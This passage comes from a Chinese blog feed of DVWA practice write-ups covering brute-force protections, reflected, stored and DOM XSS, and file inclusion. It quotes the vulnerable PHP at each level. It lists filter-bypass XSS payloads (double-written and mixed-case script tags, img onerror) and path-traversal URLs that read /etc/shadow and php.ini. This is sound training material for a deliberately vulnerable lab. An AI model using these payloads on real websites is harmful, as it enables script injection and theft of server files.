class="line"><span class="comment">//GenerateAnti-CSRFtoken</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>代码分析：</p>
<p>​      在Medium的基础上增加了Token的验证，且每个Token只能使用一次</p>
<p>通过抓包，可以看到在登录验证时提交了四个参数；username,password,Login以及user_token</p>
<p><img src="/images/Brute_Force/3.jpg" alt="3"></p>
<p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交，服务器收到请求后，会优先做token的检查，再进行SQL注入</p>
<p><strong>stripslasher（）</strong>函数（去除字符串中的反斜杠字符，如果有俩个则只去掉一个）</p>
<p><strong>mysql_real_escape_string()</strong>对参数username,password进行转义过滤，进一步抵御SQL注入</p>
<p>可以尝试用Python脚本进行爆破</p>
<p><strong>四.Impossible级别</strong></p>
<p>服务器代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Login'</span>]))&#123;</span><br><span class="line"><span class="comment">//CheckAnti-CSRFtoken</span></span><br><span class="line">checkToken($_REQUEST[<span class="string">'user_token'</span>],$_SESSION[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sanitiseusernameinput</span></span><br><span class="line">$user=$_POST[<span class="string">'username'</span>];</span><br><span class="line">$user=stripslashes($user);</span><br><span class="line">$user=mysql_real_escape_string($user);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sanitisepasswordinput</span></span><br><span class="line">$pass=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$pass=stripslashes($pass);</span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Defaultvalues</span></span><br><span class="line">$total_failed_login=<span class="number">3</span>;</span><br><span class="line">$lockout_time=<span class="number">15</span>;</span><br><span class="line">$account_locked=<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checkthedatabase(Checkuserinformation)</span></span><br><span class="line">$data=$db-&gt;prepare(<span class="string">'SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;'</span>);</span><br><span class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row=$data-&gt;fetch();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checktoseeiftheuserhasbeenlockedout.</span></span><br><span class="line"><span class="keyword">if</span>(($data-&gt;rowCount()==<span class="number">1</span>)&amp;&amp;($row[<span class="string">'failed_login'</span>]&gt;=$total_failed_login))&#123;</span><br><span class="line"><span class="comment">//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!</span></span><br><span class="line"><span class="comment">//echo"&lt;pre&gt;&lt;br/&gt;Thisaccounthasbeenlockedduetotoomanyincorrectlogins.&lt;/pre&gt;";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Calculatewhentheuserwouldbeallowedtologinagain</span></span><br><span class="line">$last_login=$row[<span class="string">'last_login'</span>];</span><br><span class="line">$last_login=strtotime($last_login);</span><br><span class="line">$timeout=strtotime(<span class="string">"&#123;$last_login&#125;+&#123;$lockout_time&#125;minutes"</span>);</span><br><span class="line">$timenow=strtotime(<span class="string">"now"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checktoseeifenoughtimehaspassed,ifithasn'tlockedtheaccount</span></span><br><span class="line"><span class="keyword">if</span>($timenow&gt;$timeout)</span><br><span class="line">$account_locked=<span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Checkthedatabase(ifusernamematchesthepassword)</span></span><br><span class="line">$data=$db-&gt;prepare(<span class="string">'SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;'</span>);</span><br><span class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</span><br><span class="line">$data-&gt;bindParam(<span class="string">':password'</span>,$pass,PDO::PARAM_STR);</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row=$data-&gt;fetch();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Ifitsavalidlogin...</span></span><br><span class="line"><span class="keyword">if</span>(($data-&gt;rowCount()==<span class="number">1</span>)&amp;&amp;($account_locked==<span class="keyword">false</span>))&#123;</span><br><span class="line"><span class="comment">//Getusersdetails</span></span><br><span class="line">$avatar=$row[<span class="string">'avatar'</span>];</span><br><span class="line">$failed_login=$row[<span class="string">'failed_login'</span>];</span><br><span class="line">$last_login=$row[<span class="string">'last_login'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Loginsuccessful</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;imgsrc="</span>&#123;$avatar&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hadtheaccountbeenlockedoutsincelastlogin?</span></span><br><span class="line"><span class="keyword">if</span>($failed_login&gt;=$total_failed_login)&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;:Someonemightofbeenbruteforcingyouraccount.&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;p&gt;Numberofloginattempts:&lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br/&gt;Lastloginattemptwasat:&lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Resetbadlogincount</span></span><br><span class="line">$data=$db-&gt;prepare(<span class="string">'UPDATEusersSETfailed_login="0"WHEREuser=(:user)LIMIT1;'</span>);</span><br><span class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//Loginfailed</span></span><br><span class="line">sleep(rand(<span class="number">2</span>,<span class="number">4</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//Givetheusersomefeedback</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;br/&gt;&lt;br/&gt;Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.&lt;br/&gt;Ifthisisthecase,&lt;em&gt;pleasetryagainin&#123;$lockout_time&#125;minutes&lt;/em&gt;.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Updatebadlogincount</span></span><br><span class="line">$data=$db-&gt;prepare(<span class="string">'UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;'</span>);</span><br><span class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Setthelastlogintime</span></span><br><span class="line">$data=$db-&gt;prepare(<span class="string">'UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;'</span>);</span><br><span class="line">$data-&gt;bindParam(<span class="string">':user'</span>,$user,PDO::PARAM_STR);</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GenerateAnti-CSRFtoken</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>①当检测到错误三次以上时，会锁定账号</p>
<p>②参数POST方式传递，并且增加了mysql_real_escape_string过滤</p>
<p>③增加user_token，防止csrf</p>
]]></content>
      <categories>
        <category>DVWA练习</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-XSS</title>
    <url>/2018/08/10/XSS/</url>
    <content><![CDATA[<h1 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a><strong><em>DVWA练习</em></strong></h1><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>跨站脚本攻击，某种意义上也是一种注入攻击，指攻击者在页面中注入恶意脚本代码，当受害者访问该页面时，恶意代码会在其浏览器执行，xss分为三种：存储型xss，反射型xss，DOM型xss</p>
<a id="more"></a>

<p><strong><em>反射型XSS</em></strong></p>
<p><strong>一、Low级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>用户参数直接显示在页面上存在反射型XSS漏洞</p>
<p>漏洞利用：</p>
<p>构造JS语句<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>成功弹框</p>
<p><img src="/images/XSS/1.png" alt="1"></p>
<p><strong>二、Medium级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>str_replace()函数过滤了<code>&lt;script&gt;</code>标签</p>
<p>漏洞利用：</p>
<p>①双写绕过：<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p>②使用大小写混写绕过：<code>&lt;ScRipt&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="/images/XSS/2.png" alt="2"></p>
<p><strong>三、High级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>代码分析：</p>
<p><code>$name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code></p>
<p>  利用正则表达式过滤了<code>&lt;script&gt;</code>标签，且i会不区分大小写，所以无法使用双写绕过或大小写混写绕过。</p>
<p>漏洞利用：</p>
<p>可以使用img，body等标签的时间或者iframe等标签的src注入恶意的js代码</p>
<p>构造<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p>
<p><img src="/images/XSS/3.png" alt="3"></p>
<p><strong>四、Impossible级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>htmlspecialchars()函数将预定义的字符&amp;，“，‘，&lt;等转换为实体字符，防止浏览器将其作为HTML元素</p>
<p><strong><em>存储型XSS</em></strong></p>
<p><strong>一、Low级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = stripslashes( $message ); </span><br><span class="line">    $message = mysql_real_escape_string( $message ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = mysql_real_escape_string( $name ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>函数介绍：</p>
<p><strong>trim(string,charlist)</strong></p>
<p>函数移除字符串两侧的空白字符或其他预定义字符（\t、\n、\x0B、\r以及空格），可选参数charlist支持添加额外需要删除的字符。</p>
<p><strong>mysql_real_escape_string(string,connection)</strong></p>
<p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p>
<p><strong>stripslashes(string)</strong></p>
<p>函数删除字符串中的反斜杠。</p>
<p>代码分析：</p>
<p>对输入并没有做过滤与检查，且存储在数据库中，所以存在存储型XSS漏洞。</p>
<p>漏洞利用：</p>
<p>message一栏输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，成功弹框 </p>
<p><img src="/images/XSS/4.png" alt="4"></p>
<p><strong>二、Medium级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message = mysql_real_escape_string( $message ); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name ); </span><br><span class="line">    $name = mysql_real_escape_string( $name ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>函数介绍：</p>
<p><strong>strip_tags()*</strong></p>
<p>函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。</b></p>
<p><strong>addslashes()</strong></p>
<p>函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
<p>代码分析：</p>
<p>由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。 </p>
<p>漏洞利用：</p>
<p>抓包修改name参数：</p>
<p>①双写绕过</p>
<p>②大小写混写绕过</p>
<p><img src="/images/XSS/5.png" alt="5"></p>
<p>成功弹框</p>
<p><img src="/images/XSS/6.png" alt="6"></p>
<p><strong>三、High级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) ); </span><br><span class="line">    $message = mysql_real_escape_string( $message ); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name ); </span><br><span class="line">    $name = mysql_real_escape_string( $name ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是忽略了对img，iframe等其它标签的过滤与检查</p>
<p>漏洞利用：</p>
<p>抓包修改<strong>name</strong>参数</p>
<p><img src="/images/XSS/7.png" alt="7"></p>
<p>修改name为<code>&lt;img src=1 onerror=alert(1)&gt;</code>，成功弹框</p>
<p><img src="/images/XSS/8.png" alt="8"></p>
<p><strong>四、Impossible级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = stripslashes( $message ); </span><br><span class="line">    $message = mysql_real_escape_string( $message ); </span><br><span class="line">    $message = htmlspecialchars( $message ); </span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = stripslashes( $name ); </span><br><span class="line">    $name = mysql_real_escape_string( $name ); </span><br><span class="line">    $name = htmlspecialchars( $name ); </span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>代码分析：</p>
<p>通过使用htmlspecialchars函数，抵御了XSS </p>
<p><strong><em>DOM型XSS</em></strong></p>
<p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<p><strong>可以触发DOM型XSS的属性</strong></p>
<blockquote>
<ol>
<li>document.referer属性</li>
<li>window.name属性</li>
<li>location属性</li>
<li>innerHTML属性</li>
<li>documen.write属性</li>
</ol>
</blockquote>
<p><strong>一、Low级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># No protections, anything goes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>代码分析：</p>
<p>服务器端无防护措施</p>
<p>漏洞利用：</p>
<p>在火狐浏览器中直接在url后边插入<code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code></p>
<p><img src="/images/XSS/9.png" alt="9"></p>
<p><strong>二、Medium级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    $default = $_GET[<span class="string">'default'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">        header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>函数介绍：</p>
<p><strong>stripos(string,find,start)</strong> </p>
<p>函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。 </p>
<p>代码分析：</p>
<p>服务器端验证default是否为空，再检测其中是否含有<code>&lt;script&gt;</code>标签，如果有则退出</p>
<p>漏洞利用：</p>
<p>可以利用事件来触发XSS，需要使用<code>&lt;/options&gt;&lt;/select&gt;</code>来闭合标签</p>
<p><img src="/images/XSS/10.png" alt="10"></p>
<p><strong>三、High级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">            header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>这里使用了白名单，在白名单列表中的允许通过</p>
<p>漏洞利用：</p>
<p>利用#过滤，URL的部分发往服务器时#号后面的并不会发送到服务器，但是javascript代码还会正常读取 </p>
<p><strong>四、Impossible级别</strong></p>
<p>服务器端代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don't need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>在客户端进行处理防护</p>
]]></content>
      <categories>
        <category>DVWA练习</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA-File Inclusion</title>
    <url>/2018/08/10/File%20Inclusion/</url>
    <content><![CDATA[<h1 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a><strong><em>DVWA练习</em></strong></h1><h4 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h4><p><strong>文件包含漏洞</strong>，指但服务器开启allow_url_include选项是，就可以通过php的某些特性函数如：include(),require(),include_once()和require_once()利用url区动态的包含文件，此时如果没有对文件来源进行严格审查就会导致任意文件读取或者任意命令执行。</p>
<p><strong>远程文件包含漏洞</strong>是因为开启了PHP配置中的allow_url_fopen选项（服务器允许包含一个远程的文件)</p>
<a id="more"></a>

<p><strong>一.Low级别</strong></p>
<p>服务器代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="comment">//Thepagewewishtodisplay</span></span><br><span class="line">$file=$_GET[<span class="string">'page'</span>];</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>服务器端对page参数没有做任何检查和过滤，文件名直接从GET[page]中获取，可以直接改为任意文件</p>
<p>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会打印文件内容 。</p>
<p>漏洞利用；</p>
<ol>
<li><p>输入<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=/etc/shadow</code></p>
<p>页面报错，说明服务器系统不是Linux，但同时暴露了服务器文件的绝对路径 </p>
</li>
</ol>
<p><img src="/images/File_Inclusion/1.png" alt="1"></p>
<ol start="2">
<li><p>然后可以构造url</p>
<p><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=W:\wamp\www\DVWA-master\php.ini</code></p>
<p>或者</p>
<p><code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=..\..\..\wamp\www\DVWA-master\php.ini</code></p>
<p>成功读取了服务器的php.ini文件</p>
<p><img src="/images/File_Inclusion/2.png" alt="2"></p>
<p>..\是为了保证到达服务器的根目录（即目录穿越）</p>
</li>
</ol>
